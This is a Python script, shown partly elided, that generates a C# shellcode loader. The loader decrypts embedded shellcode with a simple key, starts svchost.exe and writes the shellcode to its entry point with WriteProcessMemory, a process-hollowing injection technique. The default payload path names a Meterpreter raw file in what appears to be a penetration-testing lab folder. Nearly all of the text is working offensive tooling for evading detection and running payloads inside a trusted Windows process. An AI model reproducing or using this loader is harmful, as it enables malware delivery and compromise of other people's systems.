    ...
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            ...
            */
            ...
            {
                shellcode[i] = (byte)(((uint)encryptedShellcode[i] - %(decryption_key)s) & 0xFF);
            }
            ...
            bool cResult = cp(null, "%(process_binary_path)s", IntPtr.Zero, IntPtr.Zero,
            ...
            result = wpm(pInfo.hProcess, entrypointAddr, shellcode, shellcode.Length, out bytesRW);
...
def get_code(process_binary_path, shellcode_fp, key):
    ...
    code = template % {'process_binary_path': process_binary_path, 'decryption_key': str(key),'encrypted_shellcode': to_csharp_array(encrypted_shellcode)}
    print(code)


shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
target_binary = "c:\\\\windows\\\\system32\\\\svchost.exe"
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(target_binary, shellcode_path, key)
